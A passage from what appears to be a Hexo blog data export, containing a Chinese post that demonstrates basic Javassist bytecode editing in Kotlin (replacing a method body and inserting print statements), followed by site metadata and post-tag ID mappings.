从ctClass获取方法\n    val ctMethod = ctClass.getDeclaredMethod(\"test\")\n    // 直接修改方法体\n    ctMethod.setBody(\"{ System.out.println(\\\"修改过后的内容\\\"); }\")\n    // 在方法起始行插入代码\n    ctMethod.insertBefore(\"\"\"\n        System.out.println(\"第一行\");\n        \"\"\")\n    // 在方法最后一行插入代码\n    ctMethod.insertAfter(\"\"\"\n        System.out.println(\"最后一行\");\n        \"\"\")\n    // 通过cflow检查是否为递归调用\n    ctMethod.useCflow(\"test\")\n    // 若不为递归调用则打印test\n    ctMethod.insertBefore(\"if ($\"+ \"cflow(test) == 0)\" +\n            \" System.out.println(\\\"test \\\");\")\n    // 将newInstance获得的实例直接cast成接口,避免反射带来的开销\n    (ctClass.toClass().newInstance() as TestInterface).test()\n}\n\nclass TestClass : TestInterface {\n    override fun test() {\n        println(\"测试内容1\")\n    }\n}\n\ninterface TestInterface {\n    fun test()\n}\n```\n\n输出结果:\n\n```\ntest \n第一行\n修改过后的内容\n最后一行\n```\n\n但我有些疑惑的地方在于，要怎么样才直接修改TestClass本身，让修改以后调用这个类本身的方法也是经过我们修改的方法\n\n而不是用我们修改过的ctClass实例化出一个实例来调用其中的方法\n\n毕竟，只有这样才能做到那位群友的 “把setOp方法删干净” 的效果呢","source":"_posts/try-javassist.md","raw":"---\ntitle: 初试Javassist\ndate: 2021-11-7 23:08:07\nauthor: 寒雨\nhide: false\nsummary: 列举了几种基本的javassist用法\ncategories: 笔记\ntags:\n  - 外部库\n  - Kotlin\n  - Java\n---\n\n今天看见群友做了个很有意思的东西: 拦截插件的setOp方法，彻底干掉后门插件\n\n经过一番交谈之后，我得知这是利用Javassist做的，利用javassist将setop方法的内容替换便可实现。之前也在b站看到过有大佬用javassist利用Integer装箱的特性整病毒注入的骚操作...于是我surf the internet，了解了一下这个库的用法，发现它与asm库的作用不是一般的相似。但它不同于asm库的是它的可操作空间是没有asm库大的，但它的操作会简单许多。我们甚至不需要了解字节码便能使用javassist实现一些修改字节码的功能。\n\n实验代码\n\n```kotlin\nfun main() {\n    javassistEdit()\n}\n\nfun javassistEdit() {\n    // 获取ctClass,因为是Kotlin文件所以带有Kt后缀\n    val ctClass = ClassPool.getDefault().get(\"kim.bifrost.coldrain.partice.TestClass\")\n    // 从ctClass获取方法\n    val ctMethod = ctClass.getDeclaredMethod(\"test\")\n    // 直接修改方法体\n    ctMethod.setBody(\"{ System.out.println(\\\"修改过后的内容\\\"); }\")\n    // 在方法起始行插入代码\n    ctMethod.insertBefore(\"\"\"\n        System.out.println(\"第一行\");\n        \"\"\")\n    // 在方法最后一行插入代码\n    ctMethod.insertAfter(\"\"\"\n        System.out.println(\"最后一行\");\n        \"\"\")\n    // 通过cflow检查是否为递归调用\n    ctMethod.useCflow(\"test\")\n    // 若不为递归调用则打印test\n    ctMethod.insertBefore(\"if ($\"+ \"cflow(test) == 0)\" +\n            \" System.out.println(\\\"test \\\");\")\n    // 将newInstance获得的实例直接cast成接口,避免反射带来的开销\n    (ctClass.toClass().newInstance() as TestInterface).test()\n}\n\nclass TestClass : TestInterface {\n    override fun test() {\n        println(\"测试内容1\")\n    }\n}\n\ninterface TestInterface {\n    fun test()\n}\n```\n\n输出结果:\n\n```\ntest \n第一行\n修改过后的内容\n最后一行\n```\n\n但我有些疑惑的地方在于，要怎么样才直接修改TestClass本身，让修改以后调用这个类本身的方法也是经过我们修改的方法\n\n而不是用我们修改过的ctClass实例化出一个实例来调用其中的方法\n\n毕竟，只有这样才能做到那位群友的 “把setOp方法删干净” 的效果呢","slug":"try-javassist","published":1,"updated":"2022-12-12T15:53:30.624Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23ju0002usfkla1pfcl4g","content":"<p>今天看见群友做了个很有意思的东西: 拦截插件的setOp方法，彻底干掉后门插件</p>\n<p>经过一番交谈之后，我得知这是利用Javassist做的，利用javassist将setop方法的内容替换便可实现。之前也在b站看到过有大佬用javassist利用Integer装箱的特性整病毒注入的骚操作…于是我surf the internet，了解了一下这个库的用法，发现它与asm库的作用不是一般的相似。但它不同于asm库的是它的可操作空间是没有asm库大的，但它的操作会简单许多。我们甚至不需要了解字节码便能使用javassist实现一些修改字节码的功能。</p>\n<p>实验代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">javassistEdit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">javassistEdit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 获取ctClass,因为是Kotlin文件所以带有Kt后缀</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kim.bifrost.coldrain.partice.TestClass\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 从ctClass获取方法</span>\n    <span class=\"token keyword\">val</span> ctMethod <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 直接修改方法体</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{ System.out.println(\\\"修改过后的内容\\\"); }\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 在方法起始行插入代码</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"\n        System.out.println(\"第一行\");\n        \"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 在方法最后一行插入代码</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertAfter</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"\n        System.out.println(\"最后一行\");\n        \"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 通过cflow检查是否为递归调用</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">useCflow</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 若不为递归调用则打印test</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"if ($\"</span><span class=\"token operator\">+</span> <span class=\"token string\">\"cflow(test) == 0)\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\" System.out.println(\\\"test \\\");\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 将newInstance获得的实例直接cast成接口,避免反射带来的开销</span>\n    <span class=\"token punctuation\">(</span>ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> TestInterface<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> TestClass <span class=\"token operator\">:</span> TestInterface <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"测试内容1\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">interface</span> TestInterface <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>输出结果:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">test \n第一行\n修改过后的内容\n最后一行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但我有些疑惑的地方在于，要怎么样才直接修改TestClass本身，让修改以后调用这个类本身的方法也是经过我们修改的方法</p>\n<p>而不是用我们修改过的ctClass实例化出一个实例来调用其中的方法</p>\n<p>毕竟，只有这样才能做到那位群友的 “把setOp方法删干净” 的效果呢</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<p>今天看见群友做了个很有意思的东西: 拦截插件的setOp方法，彻底干掉后门插件</p>\n<p>经过一番交谈之后，我得知这是利用Javassist做的，利用javassist将setop方法的内容替换便可实现。之前也在b站看到过有大佬用javassist利用Integer装箱的特性整病毒注入的骚操作…于是我surf the internet，了解了一下这个库的用法，发现它与asm库的作用不是一般的相似。但它不同于asm库的是它的可操作空间是没有asm库大的，但它的操作会简单许多。我们甚至不需要了解字节码便能使用javassist实现一些修改字节码的功能。</p>\n<p>实验代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">javassistEdit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">javassistEdit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 获取ctClass,因为是Kotlin文件所以带有Kt后缀</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kim.bifrost.coldrain.partice.TestClass\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 从ctClass获取方法</span>\n    <span class=\"token keyword\">val</span> ctMethod <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 直接修改方法体</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123; System.out.println(\\\"修改过后的内容\\\"); &#125;\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 在方法起始行插入代码</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"\n        System.out.println(\"第一行\");\n        \"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 在方法最后一行插入代码</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertAfter</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"\n        System.out.println(\"最后一行\");\n        \"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 通过cflow检查是否为递归调用</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">useCflow</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 若不为递归调用则打印test</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"if ($\"</span><span class=\"token operator\">+</span> <span class=\"token string\">\"cflow(test) == 0)\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\" System.out.println(\\\"test \\\");\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 将newInstance获得的实例直接cast成接口,避免反射带来的开销</span>\n    <span class=\"token punctuation\">(</span>ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> TestInterface<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> TestClass <span class=\"token operator\">:</span> TestInterface <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"测试内容1\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> TestInterface <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>输出结果:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">test \n第一行\n修改过后的内容\n最后一行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但我有些疑惑的地方在于，要怎么样才直接修改TestClass本身，让修改以后调用这个类本身的方法也是经过我们修改的方法</p>\n<p>而不是用我们修改过的ctClass实例化出一个实例来调用其中的方法</p>\n<p>毕竟，只有这样才能做到那位群友的 “把setOp方法删干净” 的效果呢</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clbx23jsr0001sfklfi3vci2u","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jt7000isfklcdhgboh1"},{"post_id":"clbx23jt6000gsfklaesxe5wv","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtb000osfklhxibal6r"},{"post_id":"clbx23jsw0003sfkl2mzc28th","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtd000ssfkleec3aqh9"},{"post_id":"clbx23jt7000hsfkl235232wz","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jte000vsfklcw2u0t81"},{"post_id":"clbx23jt9000lsfklbsrlc7vb","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtf000zsfklgk4p8cvj"},{"post_id":"clbx23jt10007sfkl013k28dw","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtg0011sfklfltdfd6d"},{"post_id":"clbx23jta000nsfklbipc5s6n","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtg0013sfklbfwnchpi"},{"post_id":"clbx23jtd000rsfkl1xt22b85","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jth0017sfklfo9p0sna"},{"post_id":"clbx23jt20009sfklau6n5ido","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jti001asfkl94cc681h"},{"post_id":"clbx23jtd000usfkl4cld3upt","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtj001dsfklaft511jv"},{"post_id":"clbx23jtf000ysfklcmlh04lk","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtk001gsfklajr0ev93"},{"post_id":"clbx23jt4000bsfkl6j730i2d","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtl001jsfklc7h40uxx"},{"post_id":"clbx23jtf0010sfkldviu9u2k","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtm001msfkl29gzd2kd"},{"post_id":"clbx23jtg0012sfkl32lr2xt5","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtn001psfkl4b2faav6"},{"post_id":"clbx23jth0016sfklgu2uh9hd","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtn001rsfkl4l3v5ddw"},{"post_id":"clbx23jti0019sfklbmdg9mpg","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jto001tsfklfd0wbgyh"},{"post_id":"clbx23jtj001csfkl45gq6z40","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtq001xsfklfdd08022"},{"post_id":"clbx23jtj001fsfklbdd82igs","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtq0020sfklex1ibw14"},{"post_id":"clbx23jtl001isfkl24s4a9tv","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtr0023sfkl16gb5q8v"},{"post_id":"clbx23jtl001lsfkl21kf7x01","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jts0025sfklhmw094u7"},{"post_id":"clbx23jtm001osfklftyf0ncv","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtt0028sfkladns96iv"},{"post_id":"clbx23jtn001qsfkl05h6fhhk","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtt002bsfkle9in1ecm"},{"post_id":"clbx23jto001ssfkl54o8fl99","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtv002fsfkl9m5ndilc"},{"post_id":"clbx23jtp001wsfkl246n0xu0","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtw002isfkl9wrgdslv"},{"post_id":"clbx23jtq001zsfklcm6g2vie","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtx002lsfkl0vtp7me5"},{"post_id":"clbx23jtr0022sfkl1hq5boc3","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jty002osfklaygt13ip"},{"post_id":"clbx23jtr0024sfklgnvq6hh0","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtz002rsfklgq2zhzxz"},{"post_id":"clbx23jts0027sfkl9j2b3f4m","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju0002vsfklew312wkr"},{"post_id":"clbx23jtt002asfklccn5f8w7","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju0002xsfkl08f12dkw"},{"post_id":"clbx23jtu002esfklfuouehul","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju10030sfkl18hw2rfv"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23ju10032sfklg48409s4"},{"post_id":"clbx23jtx002nsfkl1shb8n78","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju10035sfkl4f4jdb7u"},{"post_id":"clbx23jty002qsfklcez0fbg1","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju10037sfkl29gw8br5"},{"post_id":"clbx23ju0002usfkla1pfcl4g","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju10038sfkl3zh6hpin"},{"post_id":"clbx23jtw002ksfkl1hhcetty","category_id":"clbx23jty002psfkl4w9y0uxc","_id":"clbx23ju1003bsfklaz6h4ope"}],"PostTag":[{"post_id":"clbx23jsr0001sfklfi3vci2u","tag_id":"clbx23jt00005sfkl31xhgp1t","_id":"clbx23jt5000esfklctw91u8k"},{"post_id":"clbx23jsw0003sfkl2mzc28th","tag_id":"clbx23jt5000dsfklbjfqhka1","_id":"clbx23jta000msfkl1xao5bvg"},{"post_id":"clbx23jt10007sfkl013k28dw","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23jtd000tsfkl1nkhhd9v"},{"post_id":"clbx23jt20009sfklau6n5ido","tag_id":"clbx23jtc000qsfklabkydf14","_id":"clbx23jth0015sfkl5os27k0l"},{"post_id":"clbx23jt20009sfklau6n5ido","tag_id":"clbx23jtf000xsfkl39kj13cp","_id":"clbx23jti0018sfklggk1fn1o"},{"post_id":"clbx23jt4000bsfkl6j730i2d","tag_id":"clbx23jth0014sfkl40hi27vh","_id":"clbx23jtj001esfklgyd52fca"},{"post_id":"clbx23jt6000gsfklaesxe5wv","tag_id":"clbx23jti001bsfkl78tv6pc3","_id":"clbx23jtl001ksfklgmm2h69u"},{"post_id":"clbx23jt7000hsfkl235232wz","tag_id":"clbx23jtk001hsfkl19xub070","_id":"clbx23jtp001vsfklgog5ddaf"},{"post_id":"clbx23jt7000hsfkl235232wz","tag_id":"clbx23jtm001nsfkl9tf97p7j","_id":"clbx23jtq001ysfkl8x6r7nou"},{"post_id":"clbx23jt9000lsfklbsrlc7vb","tag_id":"clbx23jtp001usfkl8zg337ee","_id":"clbx23jtt0029sfkl3dkd9t5b"},{"post_id":"clbx23jt9000lsfklbsrlc7vb","tag_id":"clbx23jtq0021sfklca3sf5ys","_id":"clbx23jtu002csfkla83f35nu"},{"post_id":"clbx23jta000nsfklbipc5s6n","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23jtv002gsfklh4ioezrx"},{"post_id":"clbx23jta000nsfklbipc5s6n","tag_id":"clbx23jts0026sfkl53er7zxi","_id":"clbx23jtw002jsfkl95rabz5p"},{"post_id":"clbx23jtx002nsfkl1shb8n78","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju0002tsfkl5lxv7dy5"},{"post_id":"clbx23jtx002nsfkl1shb8n78","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju0002wsfkld7k80cue"},{"post_id":"clbx23jtd000rsfkl1xt22b85","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju0002zsfklf6xo8v4a"},{"post_id":"clbx23jtd000rsfkl1xt22b85","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju10031sfklfmcc5s17"},{"post_id":"clbx23jtd000usfkl4cld3upt","tag_id":"clbx23jtz002ssfkl9som4vvj","_id":"clbx23ju10033sfklbeuvhetu"},{"post_id":"clbx23jtf000ysfklcmlh04lk","tag_id":"clbx23ju0002ysfkl7sbn8i73","_id":"clbx23ju10036sfkl3tlr630b"},{"post_id":"clbx23jtf0010sfkldviu9u2k","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23ju1003asfkl0lvl2b3k"},{"post_id":"clbx23jtf0010sfkldviu9u2k","tag_id":"clbx23ju10034sfkl02pz5k1j","_id":"clbx23ju1003csfkl7ih1esgl"},{"post_id":"clbx23jtg0012sfkl32lr2xt5","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23ju2003gsfkleuqv8q6u"},{"post_id":"clbx23jtg0012sfkl32lr2xt5","tag_id":"clbx23ju1003dsfklf51t7jxu","_id":"clbx23ju2003hsfkl9flbg73u"},{"post_id":"clbx23jtg0012sfkl32lr2xt5","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju3003jsfkl0pwh8zcx"},{"post_id":"clbx23jth0016sfklgu2uh9hd","tag_id":"clbx23ju2003fsfkl7wh2a9mw","_id":"clbx23ju4003nsfkl3enxg9r1"},{"post_id":"clbx23jth0016sfklgu2uh9hd","tag_id":"clbx23ju2003isfklhmeme1wb","_id":"clbx23ju4003osfkl04dfahrv"},{"post_id":"clbx23jth0016sfklgu2uh9hd","tag_id":"clbx23ju3003ksfklehqnccxf","_id":"clbx23ju4003qsfkl1ts4106w"},{"post_id":"clbx23jth0016sfklgu2uh9hd","tag_id":"clbx23ju3003lsfkl4ii0ae7b","_id":"clbx23ju4003rsfklc717400v"},{"post_id":"clbx23jti0019sfklbmdg9mpg","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju5003usfkl0dpx6rz9"},{"post_id":"clbx23jti0019sfklbmdg9mpg","tag_id":"clbx23ju4003psfkl2xr61e7i","_id":"clbx23ju5003vsfkl05inehmi"},{"post_id":"clbx23jti0019sfklbmdg9mpg","tag_id":"clbx23ju4003ssfkl69jnfgbg","_id":"clbx23ju5003xsfklfgkre3y7"},{"post_id":"clbx23jtj001fsfklbdd82igs","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju60040sfklen2k39os"},{"post_id":"clbx23jtj001fsfklbdd82igs","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju60041sfklhq9fcp7k"},{"post_id":"clbx23jtj001fsfklbdd82igs","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23ju60043sfkl5qg4ekku"},{"post_id":"clbx23jtl001isfkl24s4a9tv","tag_id":"clbx23ju6003zsfkl5s979v58","_id":"clbx23ju60044sfkle6ludmcg"},{"post_id":"clbx23jtl001lsfkl21kf7x01","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju70049sfkl5d308ouc"},{"post_id":"clbx23jtl001lsfkl21kf7x01","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju7004asfkld495fe44"},{"post_id":"clbx23jtl001lsfkl21kf7x01","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23ju8004csfklfopkc4o3"},{"post_id":"clbx23jtl001lsfkl21kf7x01","tag_id":"clbx23ju3003ksfklehqnccxf","_id":"clbx23ju8004dsfkl7ppf1o7u"},{"post_id":"clbx23jtm001osfklftyf0ncv","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju8004fsfkl8sdoaqx8"},{"post_id":"clbx23jtm001osfklftyf0ncv","tag_id":"clbx23ju7004bsfkl2vbmh251","_id":"clbx23ju8004gsfkl1zji150r"},{"post_id":"clbx23jtm001osfklftyf0ncv","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23ju8004isfklcl9y634r"},{"post_id":"clbx23jtn001qsfkl05h6fhhk","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju9004ksfkl90yv908r"},{"post_id":"clbx23jtn001qsfkl05h6fhhk","tag_id":"clbx23ju8004hsfkl39pz62us","_id":"clbx23ju9004lsfkl13bn4uem"},{"post_id":"clbx23jto001ssfkl54o8fl99","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju9004nsfklbmhj4wcr"},{"post_id":"clbx23jtp001wsfkl246n0xu0","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23jua004qsfkl5mrjgool"},{"post_id":"clbx23jtp001wsfkl246n0xu0","tag_id":"clbx23ju9004osfkl0zy99u9l","_id":"clbx23jua004rsfkl9j6bfknc"},{"post_id":"clbx23jtp001wsfkl246n0xu0","tag_id":"clbx23jt5000dsfklbjfqhka1","_id":"clbx23jua004tsfkl5g4pcokz"},{"post_id":"clbx23jtq001zsfklcm6g2vie","tag_id":"clbx23ju9004psfkl7xvie6yw","_id":"clbx23jub004wsfkl2ajy1cpk"},{"post_id":"clbx23jtq001zsfklcm6g2vie","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23jub004xsfkl170yaghy"},{"post_id":"clbx23jtq001zsfklcm6g2vie","tag_id":"clbx23jua004usfkl9b5o1q8x","_id":"clbx23jub004zsfkl1ncp1afx"},{"post_id":"clbx23jtr0022sfkl1hq5boc3","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23juc0052sfkl7xdv1xpo"},{"post_id":"clbx23jtr0022sfkl1hq5boc3","tag_id":"clbx23jub004ysfkl8l2r6lah","_id":"clbx23juc0053sfklde2idbex"},{"post_id":"clbx23jtr0022sfkl1hq5boc3","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23juc0055sfklc1zt7j4i"},{"post_id":"clbx23jtr0024sfklgnvq6hh0","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23juc0056sfklckpvdwr3"},{"post_id":"clbx23jtr0024sfklgnvq6hh0","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23juc0058sfkld2f6bi6n"},{"post_id":"clbx23jts0027sfkl9j2b3f4m","tag_id":"clbx23jt